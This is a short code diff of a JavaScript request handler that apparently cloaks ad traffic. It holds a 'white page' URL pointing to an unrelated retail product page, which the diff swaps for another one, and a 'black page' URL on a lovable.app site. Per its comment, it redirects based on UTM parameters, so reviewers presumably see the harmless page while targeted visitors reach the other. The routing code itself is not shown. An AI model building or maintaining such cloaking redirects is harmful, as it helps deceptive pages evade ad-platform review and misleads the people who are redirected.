@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://watchdirect.com.au/products/wenger-attitude-retro-inspired-chrono-watch-01-1543-117";
+    const whitePageURL = "https://phonecase.pk/collections/baseus/products/baseus-grain-pro-car-charger-dual-usb-4-8a-black";
     const blackPageURL = "https://msgurupml.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
